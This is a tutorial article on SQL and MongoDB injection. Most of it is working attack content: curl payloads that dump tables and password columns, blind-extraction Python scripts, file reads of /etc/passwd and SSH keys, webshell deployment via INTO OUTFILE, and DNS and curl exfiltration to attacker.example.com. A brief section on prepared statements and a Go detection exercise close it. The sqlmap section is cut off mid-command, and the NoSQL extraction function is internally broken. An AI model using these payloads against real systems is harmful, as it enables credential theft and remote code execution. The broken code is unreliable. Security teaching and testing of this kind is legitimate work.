SQL Injection

Exploiting unsanitized user input in SQL queries to bypass authentication, extract data, read filesystem files, and achieve remote code execution.

Overview

SQL injection tricks a database into treating user input as query code instead of data. This article shows how to confirm the flaw with a single quote, exploit it with error-based and UNION payloads, and extract data through boolean and time-based blind channels. It then covers file read and write, NoSQL injection, second-order injection, sqlmap, and the prepared statements that close the hole. By the end you can run a full injection test and explain why parameterized queries stop it.

Required Reading

  • HTTP - request/response structure, query parameters, POST bodies, headers
  • Authentication - SQL backed authentication patterns, session management

The Problem

SQL injection exists wherever user-controlled input is concatenated into a SQL query string. The database cannot distinguish between code (the query structure) and data (the user's input). When a developer writes: 

# VULNERABLE: string concatenation
username = request.form['username']
password = request.form['password']
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
cursor.execute(query)

The attacker supplies ' OR 1=1 -- as the username, and the executed query becomes: 

SELECT * FROM users WHERE username='' OR 1=1 --' AND password='whatever'

The -- comments out the rest. OR 1=1 is always true. The query returns all users. This is the simplest form but the principle scales to any injection point: URL parameters, POST bodies, cookies, HTTP headers, JSON fields in NoSQL stores - anywhere data flows into a query interpreter.

Manual Detection: Single-Quote Method

The first probe is always a single quote - it breaks the query syntax, and the error message tells you what database and sometimes the query structure. 

# Test parameter 'id' for SQLi
curl -s 'https://target.example.com/product?id=1'
curl -s 'https://target.example.com/product?id=1''

# Responses to interpret:
# "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version"
#   → MySQL, injection confirmed
# "Unclosed quotation mark after the character string"
#   → MSSQL
# "ERROR: unterminated quoted string at or near"
#   → PostgreSQL
# "near \"1''\": syntax error"
#   → SQLite

# If the application suppresses errors, test the second probe — boolean logic
curl -s 'https://target.example.com/product?id=1'
curl -s 'https://target.example.com/product?id=1 AND 1=1'   # Should return same as id=1
curl -s 'https://target.example.com/product?id=1 AND 1=2'   # Should return nothing/different

If AND 1=1 returns the same result but AND 1=2 returns nothing or a different page, the injection is boolean-based. The database is evaluating your injected condition.

Double Quote Test

# Some queries use double quotes: SELECT * FROM users WHERE username="admin"
curl -s 'https://target.example.com/search?q=admin"'
curl -s 'https://target.example.com/search?q=admin" OR "1"="1'
curl -s 'https://target.example.com/search?q=admin" OR "1"="2'

Backslash Escaping Test

# MySQL interprets \' as an escaped quote; PostgreSQL does not (uses '' for escaping)
curl -s 'https://target.example.com/search?q=admin\''
# MySQL: may not error (backslash escapes the quote)
# PostgreSQL: will error on the lone quote

Error-Based Extraction

When the database returns error messages, extract data through them. This works by intentionally causing type conversion errors that embed data in the error string. 

# MySQL: Extract database version via error
curl -s 'https://target.example.com/product?id=1 AND EXTRACTVALUE(1,CONCAT(0x3a,VERSION()))'
# Error: XPATH syntax error: ':8.0.36' — version = 8.0.36

# MySQL: Extract current database user
curl -s 'https://target.example.com/product?id=1 AND EXTRACTVALUE(1,CONCAT(0x3a,USER()))'
# Error: XPATH syntax error: ':root@localhost'

# MySQL: Extract table names one by one
# Extract first table from current database
curl -s "https://target.example.com/product?id=1 AND EXTRACTVALUE(1,CONCAT(0x3a,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))"
# To get next: LIMIT 1,1  LIMIT 2,2  LIMIT 3,3 ...

# MySQL: Extract column names from a known table
curl -s "https://target.example.com/product?id=1 AND EXTRACTVALUE(1,CONCAT(0x3a,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)))"

# MySQL: Extract actual data (subject to EXTRACTVALUE 32-char limit — use SUBSTRING)
curl -s "https://target.example.com/product?id=1 AND EXTRACTVALUE(1,CONCAT(0x3a,(SELECT CONCAT(username,':',password) FROM users LIMIT 0,1)))"

# MySQL: Bypass 32-char EXTRACTVALUE limit with SUBSTRING
curl -s "https://target.example.com/product?id=1 AND EXTRACTVALUE(1,CONCAT(0x3a,SUBSTRING((SELECT GROUP_CONCAT(username,':',password) FROM users),1,32)))"
curl -s "https://target.example.com/product?id=1 AND EXTRACTVALUE(1,CONCAT(0x3a,SUBSTRING((SELECT GROUP_CONCAT(username,':',password) FROM users),33,64)))"

PostgreSQL error-based extraction

# PostgreSQL version
curl -s "https://target.example.com/product?id=1 AND cast(version() as numeric)"

# PostgreSQL current database
curl -s "https://target.example.com/product?id=1 AND cast(current_database() as numeric)"

# PostgreSQL extract table names
curl -s "https://target.example.com/product?id=1 AND cast((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0) as numeric)"

MSSQL error-based extraction

# MSSQL version
curl -s "https://target.example.com/product?id=1 AND 1=CONVERT(int, @@version)"

# MSSQL database name
curl -s "https://target.example.com/product?id=1 AND 1=CONVERT(int, DB_NAME())"

# MSSQL current user
curl -s "https://target.example.com/product?id=1 AND 1=CONVERT(int, SYSTEM_USER)"

UNION-Based Injection

UNION injection appends attacker-controlled result sets to legitimate queries. Requirements: the original query must return data to the page; you must match the column count; you must find visible output columns. 

# Step 1: Determine column count via ORDER BY
curl -s 'https://target.example.com/product?id=1 ORDER BY 1'   # works
curl -s 'https://target.example.com/product?id=1 ORDER BY 2'   # works
curl -s 'https://target.example.com/product?id=1 ORDER BY 3'   # works
curl -s 'https://target.example.com/product?id=1 ORDER BY 4'   # error → 3 columns

# Step 2: Determine column count via NULL padding (works on all DBMS)
curl -s 'https://target.example.com/product?id=1 UNION SELECT NULL--'
curl -s 'https://target.example.com/product?id=1 UNION SELECT NULL,NULL--'
curl -s 'https://target.example.com/product?id=1 UNION SELECT NULL,NULL,NULL--'
# When the error stops: that's the column count

# Step 3: Find which columns appear in the output
curl -s "https://target.example.com/product?id=1 UNION SELECT 'col1','col2','col3'--"
# Look for 'col1', 'col2', 'col3' in the response — those columns are visible

# Step 4: Extract data through visible columns
# Replace visible column positions with data-extraction queries
curl -s "https://target.example.com/product?id=1 UNION SELECT 1,@@version,3--"         # MySQL
curl -s "https://target.example.com/product?id=1 UNION SELECT 1,version(),3--"          # PostgreSQL
curl -s "https://target.example.com/product?id=1 UNION SELECT 1,sqlite_version(),3--"   # SQLite
curl -s "https://target.example.com/product?id=1 UNION SELECT 1,@@version,3--"           # MSSQL

# MySQL: Dump all table names
curl -s "https://target.example.com/product?id=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--"

# MySQL: Dump all columns from a specific table
curl -s "https://target.example.com/product?id=-1 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'--"

# MySQL: Dump usernames and passwords
curl -s "https://target.example.com/product?id=-1 UNION SELECT 1,GROUP_CONCAT(username,':',password),3 FROM users--"

# PostgreSQL: Dump table names
curl -s "https://target.example.com/product?id=-1 UNION SELECT 1,string_agg(table_name,','),3 FROM information_schema.tables WHERE table_schema='public'--"

# SQLite: Dump table names
curl -s "https://target.example.com/product?id=-1 UNION SELECT 1,GROUP_CONCAT(name),3 FROM sqlite_master WHERE type='table'--"

Note: Use id=-1 (a non-existent ID) so the original query returns zero rows and only your UNION data appears. This prevents the legitimate result from obscuring your extracted data.

Blind SQL Injection: Boolean-Based

When no errors and no data output appear, blind SQLi extracts data one bit at a time through boolean questions. If the page behaves differently for TRUE vs FALSE conditions, you can ask any yes/no question of the database. 

#!/usr/bin/env python3
"""
Boolean-based blind SQLi extraction.
Page returns one response for TRUE conditions, another for FALSE.
"""
import requests
import string

TARGET = "https://target.example.com/product"
PARAM = "id"
TRUE_SIZE = 1546   # Response size when condition is TRUE
CHARSET = string.ascii_letters + string.digits + "_-@.:/"

def inject_condition(condition: str) -> bool:
    """Execute a boolean condition and return True/False."""
    payload = f"1 AND ({condition})"
    resp = requests.get(TARGET, params={PARAM: payload})
    return len(resp.content) == TRUE_SIZE

def extract_length(query: str) -> int:
    """Determine the length of a subquery result."""
    for length in range(1, 256):
        if inject_condition(f"LENGTH(({query}))={length}"):
            return length
    return 0

def extract_string(query: str) -> str:
    """Extract a string character by character using binary search on ASCII."""
    length = extract_length(query)
    result = ""
    for position in range(1, length + 1):
        # Binary search over ASCII range
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            if inject_condition(f"ASCII(SUBSTRING(({query}),{position},1))<={mid}"):
                high = mid - 1
            else:
                low = mid + 1
        result += chr(low)
        print(f"\r[*] Extracting: {result}", end="", flush=True)
    print()
    return result

# Extract database name
db_name = extract_string("SELECT DATABASE()")
print(f"[+] Database: {db_name}")

# Extract table names (first table)
table_name = extract_string(
    "SELECT table_name FROM information_schema.tables "
    "WHERE table_schema=database() LIMIT 0,1"
)
print(f"[+] First table: {table_name}")

# Extract column names
column_name = extract_string(
    "SELECT column_name FROM information_schema.columns "
    f"WHERE table_name='{table_name}' LIMIT 0,1"
)
print(f"[+] First column: {column_name}")

# Extract data
users = extract_string(
    f"SELECT GROUP_CONCAT({column_name}) FROM {table_name}"
)
print(f"[+] Data: {users}")

Blind SQL Injection: Time-Based

When there are zero observable differences in response content (same page regardless of TRUE/FALSE), use time delays. The database pauses when your condition is TRUE. 

# MySQL: time-based detection
curl -s -w "\nTime: %{time_total}s\n" \
  'https://target.example.com/product?id=1 AND SLEEP(5)'
# If time_total > 5 seconds, injection confirmed

# MySQL: time-based data extraction (ask yes/no questions)
# Is the first character of database() > 'm'?
curl -s -w "\nTime: %{time_total}s\n" \
  "https://target.example.com/product?id=1 AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>109,SLEEP(3),0)"

# PostgreSQL: pg_sleep
curl -s -w "\nTime: %{time_total}s\n" \
  "https://target.example.com/product?id=1; SELECT CASE WHEN (SELECT LENGTH(current_database()))>3 THEN pg_sleep(5) ELSE pg_sleep(0) END--"

# MSSQL: WAITFOR DELAY
curl -s -w "\nTime: %{time_total}s\n" \
  "https://target.example.com/product?id=1; IF (SELECT COUNT(*) FROM information_schema.tables)>0 WAITFOR DELAY '0:0:5'--"

# SQLite: heavy computation as time delay
curl -s -w "\nTime: %{time_total}s\n" \
  "https://target.example.com/product?id=1 AND (SELECT CASE WHEN (SELECT LENGTH(sqlite_version()))>3 THEN randomblob(100000000) ELSE 0 END)"

Automated time-based extraction script

#!/usr/bin/env python3
"""
Time-based blind SQLi — extracts data via SLEEP/WAITFOR.
Slower than boolean-based but works without any response difference.
"""
import requests
import time
import string

TARGET = "https://target.example.com/product"
PARAM = "id"
BASE_TIME = 0.2   # Average response time for normal requests
DELAY = 3          # Sleep duration for TRUE conditions
CHARSET = string.ascii_lowercase + string.digits + "_-@"

def benchmark_baseline():
    """Measure normal response time."""
    times = []
    for _ in range(10):
        start = time.monotonic()
        requests.get(TARGET, params={PARAM: "1"})
        times.append(time.monotonic() - start)
    return sum(times) / len(times)

BASELINE = benchmark_baseline()
THRESHOLD = BASELINE + (DELAY / 2)

def time_condition(condition: str) -> bool:
    """Execute a condition with SLEEP; return True if delayed."""
    query = f"1 AND IF(({condition}),SLEEP({DELAY}),0)"
    start = time.monotonic()
    try:
        requests.get(TARGET, params={PARAM: query}, timeout=DELAY + 5)
    except requests.exceptions.Timeout:
        pass
    elapsed = time.monotonic() - start
    return elapsed >= THRESHOLD

def extract_length(query: str) -> int:
    """Determine result length via time-based boolean."""
    for length in range(1, 128):
        if time_condition(f"LENGTH(({query}))={length}"):
            return length
    return 0

def extract_string(query: str) -> str:
    """Extract string by time-based ASCII binary search."""
    result_length = extract_length(query)
    result = ""
    for pos in range(1, result_length + 1):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            if time_condition(f"ASCII(SUBSTRING(({query}),{pos},1))<={mid}"):
                high = mid - 1
            else:
                low = mid + 1
        result += chr(low)
        print(f"\r[*] {result}", end="", flush=True)
    print()
    return result

print(f"[*] Baseline response time: {BASELINE:.3f}s, threshold: {THRESHOLD:.3f}s")
db_user = extract_string("SELECT USER()")
print(f"[+] Current user: {db_user}")

Reading Files from the Database Server

If the database user has FILE privileges, read arbitrary files from the server's filesystem.

# MySQL: LOAD_FILE() — requires FILE privilege, file must be readable by mysql user
curl -s "https://target.example.com/product?id=-1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--"

# PostgreSQL: pg_read_file() — requires superuser or pg_read_server_files role
curl -s "https://target.example.com/product?id=-1 UNION SELECT 1,pg_read_file('/etc/passwd',0,1000000),3--"

# PostgreSQL: Read arbitrary file via COPY (requires superuser)
curl -s "https://target.example.com/product?id=1; CREATE TEMP TABLE file_read (line text); COPY file_read FROM '/etc/passwd'; SELECT * FROM file_read;--"

# MSSQL: Read file via OPENROWSET
curl -s "https://target.example.com/product?id=1; SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS file_contents--"

Common targets for file read

/etc/passwd                       # User enumeration
/etc/shadow                       # Password hashes (requires root)
/var/www/html/config.php          # Database credentials
/var/www/.env                     # Environment variables, secrets
/home/user/.ssh/id_rsa            # SSH private keys
/proc/self/environ                # Process environment variables
/var/log/apache2/access.log       # Access logs (for log poisoning)
C:\Windows\System32\drivers\etc\hosts  # Windows hosts file
C:\inetpub\wwwroot\web.config     # IIS configuration

Writing Files (Webshell Deployment)

# MySQL: INTO OUTFILE — writes query result to file
# Requires FILE privilege, file must not exist, directory must be writable
curl -s "https://target.example.com/product?id=-1 UNION SELECT 1,'<?php system($_GET[\"cmd\"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--"

# MySQL: INTO DUMPFILE — single-row binary output (no newlines/formatting)
curl -s "https://target.example.com/product?id=-1 UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO DUMPFILE '/var/www/html/cmd.php'--"

# PostgreSQL: COPY TO
curl -s "https://target.example.com/product?id=1; COPY (SELECT '<?php system($_GET[\"cmd\"]); ?>') TO '/var/www/html/shell.php';--"

# Access the uploaded shell
curl -s 'https://target.example.com/shell.php?cmd=id'
curl -s 'https://target.example.com/shell.php?cmd=cat%20/etc/passwd'

Webshell Alternatives

# PHP webshell (short)
<?=`$_GET[c]`?>

# PHP webshell (POST-based, doesn't appear in logs as much)
<?php system($_POST['c']); ?>

# ASP webshell
<% eval request("cmd") %>

# JSP webshell
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

# Python/Flask — if file write goes to a Python app directory
__import__('os').system(__import__('urllib').parse.unquote(__import__('urllib').parse.parse_qs(__import__('sys').stdin.read())['cmd'][0]))

Out-of-Band SQLi

When the injection is blind and the server firewall blocks inbound connections but allows outbound DNS , exfiltrate data through DNS queries. The attacker receives DNS requests with data encoded in the subdomain. 

# Prerequisites: set up a DNS listener on your attack box
# interactsh-client (or Burp Collaborator, or a VPS with tcpdump on port 53)

# MySQL: DNS exfiltration via LOAD_FILE + UNC path
curl -s "https://target.example.com/product?id=1'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT DATABASE()),'.attacker.example.com\\\\test'))--"

# MSSQL: DNS exfiltration via xp_dirtree
curl -s "https://target.example.com/product?id=1'; EXEC master..xp_dirtree '\\\\'+(SELECT DB_NAME())+'.attacker.example.com\\test'--"

# MSSQL: DNS exfiltration via xp_subdirs
curl -s "https://target.example.com/product?id=1'; EXEC master..xp_subdirs '\\\\'+(SELECT SYSTEM_USER)+'.attacker.example.com\\test'--"

# Oracle: DNS exfiltration via UTL_HTTP
curl -s "https://target.example.com/product?id=1' UNION SELECT UTL_HTTP.REQUEST('http://'||(SELECT username FROM all_users WHERE ROWNUM=1)||'.attacker.example.com/') FROM dual--"

OOB via HTTP requests from the database

# PostgreSQL: COPY to program (if superuser)
curl -s "https://target.example.com/product?id=1'; COPY (SELECT current_database()) TO PROGRAM 'curl http://attacker.example.com/?data='||current_database()--"

# MySQL: User-Defined Function (UDF) — requires plugin directory write
# First upload a shared library via INTO DUMPFILE, then create a function

# MSSQL: xp_cmdshell — if enabled
curl -s "https://target.example.com/product?id=1'; EXEC xp_cmdshell 'curl http://attacker.example.com/?d='+(SELECT DB_NAME())--"

Second-Order SQL Injection

Data stored through one request is used unsafely in a later query. The injection point is not where the data enters, but where it is later retrieved. 

# VULNERABLE: second-order SQLi example
# Endpoint 1: User registration — stores username safely (or so it seems)
@app.route('/register', methods=['POST'])
def register():
    username = request.form['username']  # user supplies: admin' OR '1'='1
    db.execute("INSERT INTO users (username) VALUES (?)", [username])
    # Stored as: admin' OR '1'='1

# Endpoint 2: Profile lookup — uses stored username unsafely
@app.route('/profile')
def profile():
    username = db.execute("SELECT username FROM users WHERE id=?", [session['user_id']]).fetchone()[0]
    # username = "admin' OR '1'='1"
    query = f"SELECT * FROM users WHERE username='{username}'"  # UNSAFE concatenation
    result = db.execute(query).fetchall()
    # Query becomes: SELECT * FROM users WHERE username='admin' OR '1'='1'
    # Returns ALL users
						
# Exploitation workflow:
# 1. Register with payload username: test' UNION SELECT 1,password,3 FROM users WHERE '1'='1
# 2. Log in
# 3. Visit profile page — it injects the stored username into a query
# 4. Result: profile page now contains all users' passwords

NoSQL Injection (MongoDB)

NoSQL databases parse query operators from user input when input is passed directly to query objects. Unlike SQL , the injection manipulates the query structure rather than the query string . 

# VULNERABLE: Flask + PyMongo
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    user = db.users.find_one({'username': username, 'password': password})
    # If username and password are parsed as dicts/objects, operators pass through
    if user:
        session['user'] = str(user['_id'])
        return redirect('/dashboard')
    return 'Login failed'
						
# Normal request body (URL-encoded or JSON)
# username=admin&password=admin123

# Bypass login: $ne (not equal) — matches any document where field is not the value
# If JSON body is accepted:
curl -s -X POST 'https://target.example.com/login' \
  -H 'Content-Type: application/json' \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
# Query becomes: db.users.findOne({username: {$ne: ""}, password: {$ne: ""}})
# This matches any user with a non-empty username and password → bypass

# Bypass with $regex — match any string
curl -s -X POST 'https://target.example.com/login' \
  -H 'Content-Type: application/json' \
  -d '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}'

# Extract username via $regex character-by-character (blind NoSQLi)
curl -s -X POST 'https://target.example.com/login' \
  -H 'Content-Type: application/json' \
  -d '{"username": {"$regex": "^a"}, "password": {"$ne": ""}}'
# If login succeeds → an admin username starts with 'a'

# $where operator - JavaScript execution (if enabled)
curl -s -X POST 'https://target.example.com/login' \
  -H 'Content-Type: application/json' \
  -d '{"username": "admin", "$where": "function() { var d = new Date(); while (new Date() - d < 5000); return true; }"}'
# Time-based detection via a JavaScript busy-wait (no sleep primitive exists)

# Extract data via $where injection
curl -s -X POST 'https://target.example.com/search' \
  -H 'Content-Type: application/json' \
  -d '{"search": "", "$where": "this.password.length > 5"}'
# Returns users whose password length > 5

Automated NoSQL injection extraction

#!/usr/bin/env python3
"""Blind NoSQL injection (MongoDB $regex) username/password extraction."""
import requests
import string

TARGET = "https://target.example.com/login"
CHARSET = string.ascii_lowercase + string.digits + "!@#$%^&*"

def check_prefix(username_prefix: str, password_prefix: str) -> bool:
    """Check if a credential with given prefix exists."""
    payload = {
        "username": {"$regex": f"^{username_prefix}"},
        "password": {"$regex": f"^{password_prefix}"}
    }
    resp = requests.post(TARGET, json=payload, allow_redirects=False)
    return resp.status_code == 302  # Successful login redirects

def extract_field(known_prefix: str, known_other: str, other_field: str) -> str:
    """Extract one field character by character given the other is known."""
    prefix = known_prefix
    while True:
        for char in CHARSET + "}":  # } = terminator
            if char == "}":
                return prefix
            payload = {
                other_field: known_other,
                "target": {"$regex": f"^{prefix}{char}"}
            }
            # Adapt this to the actual endpoint structure
            if check_prefix(f"^{prefix}{char}", known_other):
                prefix += char
                print(f"\r[*] {prefix}", end="", flush=True)
                break
    return prefix

# Extract admin password (assuming username "admin" is known)
password = extract_field("admin", "", "password")
print(f"\n[+] Password: {password}")

SQLmap: Automated Exploitation

SQL map automates detection, enumeration, and exploitation but understanding the manual methods is necessary to interpret its output and handle edge cases. 

# Basic detection: test all parameters
sqlmap -u 'https://target.example.com/product?id=1' --batch

# Specify parameter, database type, and risk level
sqlmap -u 'https://target.example.com/product?id=1' \

Prepared Statements: How the Fix Works

The fundamental difference between vulnerable and secure code:

# VULNERABLE: string interpolation
cursor.execute(f"SELECT * FROM users WHERE username='{username}'")
# The database parses: SELECT ... WHERE username='admin' OR '1'='1'
# The string 'admin' OR '1'='1' is parsed as SQL CODE, not DATA

# SECURE: parameterized query / prepared statement
cursor.execute("SELECT * FROM users WHERE username=?", (username,))
# The database compiles: SELECT ... WHERE username=?  (query plan is fixed)
# Then binds: parameter[0] = "admin' OR '1'='1"  (treated as literal DATA)
# The query searches for a username that LITERALLY contains the quote characters
# No injection possible — the query structure cannot be altered by data

The query is sent to the database in two phases: 1. Prepare : The database compiles the query structure (SELECT columns FROM table WHERE condition). After this phase, the query structure is immutable. 1. Execute : Data values are bound to the parameter placeholders. These values are treated strictly as data - never as code.

This works for all relational databases and most NoSQL databases. For MongoDB, use the driver's type-safe query builders instead of passing raw user dictionaries to find() . 

# SECURE: MongoDB with type checking
from bson import ObjectId

@app.route('/login', methods=['POST'])
def login():
    username = str(request.form['username'])  # Force string type
    password = str(request.form['password'])
    # Cannot pass dict/object because it's coerced to string
    user = db.users.find_one({'username': username, 'password': password})

Challenge

Write a Go tool that detects boolean-based SQLi . It requests a parameter with a true condition ( 1 AND 1=1 ) and a false condition ( 1 AND 1=2 ), compares the response length of each against a baseline, and reports when the true branch matches the baseline but the false branch does not. Point it at the vulnerable Flask app from the previous section, or at any authorized target. 

package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
)

func bodyLength(client *http.Client, target, param, value string) (int, error) {
	u, err := url.Parse(target)
	if err != nil {
		return 0, err
	}
	q := u.Query()
	q.Set(param, value)
	u.RawQuery = q.Encode()

	resp, err := client.Get(u.String())
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, err
	}
	return len(body), nil
}

func main() {
	if len(os.Args) != 3 {
		fmt.Fprintf(os.Stderr, "usage: %s <url> <param>\n", os.Args[0])
		os.Exit(1)
	}
	target, param := os.Args[1], os.Args[2]
	client := &http.Client{}

	baseline, err := bodyLength(client, target, param, "1")
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	trueLen, err := bodyLength(client, target, param, "1 AND 1=1")
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	falseLen, err := bodyLength(client, target, param, "1 AND 1=2")
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	fmt.Printf("baseline=%d true=%d false=%d\n", baseline, trueLen, falseLen)
	if trueLen == baseline && falseLen != baseline {
		fmt.Println("[+] boolean-based SQL injection is likely")
	} else {
		fmt.Println("[-] no clear boolean signal")
	}
}
